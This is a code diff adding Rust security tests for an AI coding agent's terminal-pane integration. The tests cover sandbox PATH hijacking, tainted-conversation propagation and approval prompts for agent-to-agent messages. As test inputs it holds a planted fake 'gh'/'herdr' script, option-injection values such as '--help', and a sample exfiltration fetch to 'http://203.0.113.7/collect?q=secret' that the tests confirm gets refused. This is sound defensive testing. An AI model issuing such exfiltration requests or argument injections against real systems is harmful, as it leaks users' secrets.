@@ -146,6 +146,9 @@ async fn a_session_without_host_commands_refuses_run_and_spawn_before_asking() {
 /// `marv -p`, in a Herdr pane, with every `--approve` name, `--approve-tainted` and `--approve-protected`: the door
 /// reads, and refuses to run or spawn anything.
 ///
+/// It runs the `marv` binary at `MARV_ORACLE_BIN` (or the one `cargo test --workspace` built), which `cargo test` doesn't
+/// rebuild by itself: build `marv-cli` first after a change, or this tests the old binary.
+///
 /// Two layers hold here: `marv -p` has no `host_commands` (so no `Doors::herdr`), and no `--approve` name covers
 /// `herdr:`. Proven: set `host_commands` in `run_headless` and let `--approve process` cover `herdr:` → a pane opened
 /// and the command ran (either alone: still refused).
@@ -333,5 +336,212 @@ async fn herdr_names_and_output_reach_the_terminal_only_through_printable() {
     assert!(!out.result.is_error, "{}", out.result.output);
     let text = marv_session::herdr_door::peers_text(&peers.list(), &[Some("idle".into())]);
     assert!(!text.contains('\u{1b}') && !text.contains('\u{7}'), "{text:?}");
-    assert!(text.contains("peer-1") && text.contains("w1:p5"), "{text}");
+    assert!(text.contains("peer-") && text.contains("w1:p5"), "{text}");
+}
+
+// ---- the review's fixes (marv-amb.6) ----
+
+/// `/peers stop` never answers the worker's pending question: `/exit` and Enter (or ctrl+c) are typed only into an
+/// agent Herdr calls idle or done. A working or blocked one (an approval, where Marv's Enter picks Yes) gets nothing
+/// typed: its pane is just closed.
+///
+/// Proven: dropped the idle/done check from `HerdrAdapter::stop` → `/exit` and Enter were typed into the blocked
+/// Marv: failed.
+#[tokio::test]
+async fn stopping_a_peer_types_nothing_into_an_agent_thats_busy_or_asking() {
+    use marv_mesh::herdr::{HerdrAdapter, Place, Stopped};
+    use marv_session::herdr_door::fake::{install_fake_herdr, set_pane_state};
+    for (state, marv) in [("blocked", true), ("working", true), ("blocked", false)] {
+        let herdr = TempDir::new("herdr-stop");
+        let adapter = HerdrAdapter::new(install_fake_herdr(herdr.path()), Some("w1:p1".into()));
+        let pane = adapter.open_pane(Place::Tab, None, "/w", None).await.unwrap();
+        if marv {
+            adapter.pane_run(&pane, "marv").await.unwrap();
+        } else {
+            adapter.agent_start("rev", "claude", &pane).await.unwrap();
+        }
+        set_pane_state(herdr.path(), &pane, state);
+        assert_eq!(adapter.stop(&pane, marv).await.unwrap(), Stopped::Closed);
+        let log = fake_herdr_log(herdr.path());
+        assert!(!log.iter().any(|l| l.starts_with("pane send-")), "{state}: {log:?}");
+        assert!(log.contains(&format!("pane close {pane}")), "{state}: {log:?}");
+    }
+}
+
+/// The doors' programs come only from an absolute PATH entry outside the project and the sandbox's writable folders:
+/// a `herdr` or `gh` a sandboxed command could have put there is never run (nor picked for later).
+///
+/// Proven: made `marv_sandbox::host_env::host_program` take any PATH entry, with no `outside` check → the planted gh
+/// ran (its marker appeared) and the planted herdr became the door's program: failed.
+#[tokio::test]
+async fn a_door_program_planted_in_the_project_is_never_run() {
+    use std::os::unix::fs::PermissionsExt;
+    let project = TempDir::new("doors-planted");
+    let marker = project.path().join("ran");
+    for name in ["gh", "herdr"] {
+        let program = project.write(&format!("node_modules/.bin/{name}"), &format!("#!/bin/sh\ntouch '{}'\n", marker.display()));
+        std::fs::set_permissions(&program, std::fs::Permissions::from_mode(0o755)).unwrap();
+    }
+    let planted = project.path().join("node_modules/.bin").to_string_lossy().to_string();
+    let path = format!("node_modules/.bin:.:{planted}");
+    let outside = vec![project.path().to_path_buf()];
+    let env: Vec<(String, String)> = vec![("PATH".into(), path.clone())];
+    assert!(!marv_tools::github::github_available(&env, &outside, std::time::Duration::from_secs(2)).await);
+    let herdr_env: marv_session::config::Env = [
+        ("PATH".to_string(), path),
+        ("HERDR_ENV".to_string(), "1".to_string()),
+        ("HERDR_SOCKET_PATH".to_string(), "/nonexistent.sock".to_string()),
+        ("HERDR_PANE_ID".to_string(), "w1:p1".to_string()),
+    ]
+    .into();
+    assert!(marv_session::herdr_door::setup_from_env(&herdr_env, 4, &outside).is_none());
+    assert!(!marker.exists(), "a planted program ran");
+}
+
+/// Nothing a model passes reaches the `herdr` CLI as an option: ids, names, commands and prompts starting with `-`
+/// are refused before Herdr hears anything.
+///
+/// Proven, one at a time: dropped the first-character check from `plain_id` (ids), the leading `-` check on a rename's
+/// name, the one on a run's command, and the one in `pane_prompt` (prompts and tasks) → each let its `-…` reach the
+/// fake herdr: failed.
+#[tokio::test]
+async fn nothing_starting_with_a_dash_reaches_the_herdr_cli() {
+    let (root, herdr) = (TempDir::new("herdr-dash"), TempDir::new("herdr-dash-fake"));
+    let tools: Vec<ToolRef> = vec![Arc::new(HerdrDoor::new(fake_setup(herdr.path(), 4), Arc::default()))];
+    let approver = Recorder::new(Decision::Yes);
+    let mut ctx = ToolContext::new(root.path());
+    ctx.doors.herdr = true;
+    ctx.approver = Some(approver.clone());
+    for args in [
+        json!({"action": "read", "pane": "--help"}),
+        json!({"action": "status", "pane": "-h"}),
+        json!({"action": "list", "what": "panes", "workspace": "--version"}),
+        json!({"action": "focus", "target": "-x:p1"}),
+        json!({"action": "rename", "target": "w1:p2", "name": "--help"}),
+        json!({"action": "prompt", "pane": "w1:p2", "text": "--help"}),
+        json!({"action": "run", "command": "--help"}),
+        json!({"action": "spawn", "kind": "marv", "task": "--version"}),
+    ] {
+        let out = run_tool(&herdr_call("d", args.clone()), &ctx, &tools).await;
+        assert!(out.result.is_error, "{args}: {}", out.result.output);
+    }
+    let log = fake_herdr_log(herdr.path());
+    assert!(log.iter().all(|l| !l.split(' ').any(|w| w.starts_with('-') && w != "--no-focus")), "{log:?}");
+    assert!(started(herdr.path()).is_empty(), "{log:?}");
+}
+
+/// Spawning from a tainted conversation starts the worker tainted: its command carries `MARV_TAINTED=1`, and a Marv
+/// started so treats its first message as untrusted, so its first egress asks (here: `marv -p --approve web` without
+/// `--approve-tainted` is refused).
+///
+/// Proven: dropped the taint prefix from `marv_command` → the worker's command had no MARV_TAINTED: failed; made
+/// `run_headless` ignore MARV_TAINTED → the fetch went out: failed.
+#[tokio::test]
+async fn a_worker_spawned_from_a_tainted_conversation_starts_tainted() {
+    let (root, config, herdr) = (TempDir::new("herdr-taint"), TempDir::new("herdr-taint-cfg"), TempDir::new("herdr-taint-fake"));
+    let model = Scripted::new(vec![
+        use_tools(vec![herdr_call("r1", json!({"action": "read", "pane": "w1:p2"}))]),
+        use_tools(vec![herdr_call("s1", json!({"action": "spawn", "kind": "marv", "task": "fix it"}))]),
+        say("Done."),
+    ]);
+    sdk_turn(root.path(), config.path(), model, |o| {
+        o.herdr = Some(fake_setup(herdr.path(), 4));
+        o.host_commands = true;
+        o.approve = Some(Recorder::new(Decision::Yes));
+    })
+    .await;
+    assert!(
+        started(herdr.path()).contains(&"pane run w1:p5 MARV_TAINTED=1 /opt/marv/bin/marv".to_string()),
+        "{:?}",
+        fake_herdr_log(herdr.path())
+    );
+
+    // The child side: a Marv started with MARV_TAINTED=1 asks before its first egress.
+    let (seen, proxy) = one_request_proxy();
+    let fetch = marv_oracle::script::ScriptCall {
+        id: Some("w1".into()),
+        name: "web_fetch".into(),
+        arguments: json!({"url": "http://203.0.113.7/collect?q=secret"}),
+    };
+    let child = |tainted: bool| {
+        let (root, config) = (TempDir::new("herdr-child"), TempDir::new("herdr-child-cfg"));
+        let path = std::env::var("PATH").unwrap_or_default();
+        let mut env = vec![
+            ("PATH", path.as_str()),
+            ("MARV_GITHUB", "off"),
+            ("http_proxy", proxy.as_str()),
+            ("HTTP_PROXY", proxy.as_str()),
+            ("NO_PROXY", "127.0.0.1,localhost"),
+            ("no_proxy", "127.0.0.1,localhost"),
+        ];
+        if tainted {
+            env.push(("MARV_TAINTED", "1"));
+        }
+        marv_guards::headless_steps(root.path(), config.path(), vec![vec![fetch.clone()]], &["--approve", "web"], &env)
+    };
+    let out = child(true);
+    assert_eq!(out.code, Some(3), "{}\n{}", out.result, out.stderr);
+    assert_eq!(out.result["refused"][0]["tool"], "web_fetch");
+    assert!(seen.lock().unwrap().is_empty(), "nothing went out");
+    // Control: without it, the same fetch goes out.
+    child(false);
+    assert_eq!(seen.lock().unwrap().len(), 1);
+}
+
+/// A local HTTP proxy that answers every request with a short page and records the request lines.
+fn one_request_proxy() -> (Arc<std::sync::Mutex<Vec<String>>>, String) {
+    use std::io::{Read, Write};
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let port = listener.local_addr().unwrap().port();
+    let seen = Arc::new(std::sync::Mutex::new(Vec::new()));
+    let log = seen.clone();
+    std::thread::spawn(move || {
+        for mut stream in listener.incoming().flatten() {
+            let mut head = Vec::new();
+            let mut buf = [0u8; 4096];
+            while !head.windows(4).any(|w| w == b"\r\n\r\n") {
+                match stream.read(&mut buf) {
+                    Ok(0) | Err(_) => break,
+                    Ok(n) => head.extend_from_slice(&buf[..n]),
+                }
+            }
+            log.lock().unwrap().push(String::from_utf8_lossy(&head).lines().next().unwrap_or_default().to_string());
+            let body = "a page";
+            let _ = stream.write_all(
+                format!(
+                    "HTTP/1.1 200 OK\r\ncontent-type: text/plain\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
+                    body.len()
+                )
+                .as_bytes(),
+            );
+        }
+    });
+    (seen, format!("http://127.0.0.1:{port}"))
+}
+
+/// In a tainted conversation a prompt to another agent is egress: asked every time (an earlier "always" for that
+/// pane doesn't answer it), and the approval says the receiving agent will take the text as the user's own words.
+///
+/// Proven: left `prompt` out of `HerdrDoor::uses_network` → the second prompt was answered from "always": failed;
+/// dropped the `OWN_WORDS` warning → failed.
+#[tokio::test]
+async fn a_prompt_in_a_tainted_conversation_asks_every_time_and_says_whose_words() {
+    let (root, config, herdr) = (TempDir::new("herdr-pt"), TempDir::new("herdr-pt-cfg"), TempDir::new("herdr-pt-fake"));
+    let prompt = || use_tools(vec![herdr_call("p", json!({"action": "prompt", "pane": "w1:p2", "text": "review the diff"}))]);
+    let model = Scripted::new(vec![
+        prompt(),
+        use_tools(vec![herdr_call("r1", json!({"action": "read", "pane": "w1:p2"}))]),
+        prompt(),
+        say("Done."),
+    ]);
+    let approver = Recorder::new(Decision::Always);
+    sdk_turn(root.path(), config.path(), model, |o| {
+        o.herdr = Some(fake_setup(herdr.path(), 4));
+        o.approve = Some(approver.clone());
+    })
+    .await;
+    let asked: Vec<_> = approver.requests().into_iter().filter(|r| r.tool == HERDR).collect();
+    assert_eq!(asked.len(), 2, "the earlier \"always\" didn't answer the tainted prompt");
+    assert!(!asked[0].must_ask && asked[1].must_ask);
+    assert_eq!(asked[1].preview.warning.as_deref(), Some(marv_session::herdr_door::OWN_WORDS));
 }
